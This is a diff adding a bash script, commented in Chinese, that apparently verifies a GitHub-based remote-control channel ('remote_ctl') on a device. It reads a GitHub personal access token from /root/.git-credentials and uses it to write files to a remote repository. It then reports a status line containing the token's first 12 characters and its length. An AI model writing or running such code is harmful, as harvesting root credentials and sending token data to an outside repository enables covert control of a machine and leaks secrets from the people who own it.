@@ -1,0 +1,16 @@
+287817
+# 端到端验证:只用设备自己恢复的凭据(不带任何token),测out.txt能否写回+报告状态
+API="https://api.github.com/repos/Thousands91/-1/contents/remote"
+# 从设备自己的凭据读token(模拟remote_ctl的get_tok路径)
+CRED=$(grep -oE 'github_pat_[A-Za-z0-9_]+' /root/.git-credentials 2>/dev/null | head -1)
+CPRE="${CRED:0:12} LEN=${#CRED}"
+# 用设备自己的token测PUT
+CODE=$(timeout 15 curl -s -o /dev/null -w '%{http_code}' --max-time 13 -X PUT -H "Authorization: token $CRED" "$API/_restore_verify.txt" -d '{"message":"rv","content":"dGVzdA==","branch":"main"}' 2>/dev/null)
+NOW=$(date '+%m-%d %H:%M:%S')
+R="time=$NOW | 设备凭据=$CPRE | 自token_PUT=$CODE"
+# 回传结果也用设备自己的token写(端到端证明写权限恢复)
+BB=$(echo -n "$R" | base64 -w0)
+SHA=$(timeout 15 curl -s -H "Authorization: token $CRED" "$API/restore_verify.txt" 2>/dev/null | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
+if [ -n "$SHA" ]; then P="{\"message\":\"恢复验证\",\"content\":\"$BB\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else P="{\"message\":\"恢复验证\",\"content\":\"$BB\",\"branch\":\"main\"}"; fi
+curl -s --max-time 20 -X PUT -H "Authorization: token $CRED" "$API/restore_verify.txt" -d "$P" -o /dev/null -w "PUT结果:%{http_code}\n"
+echo "$R"
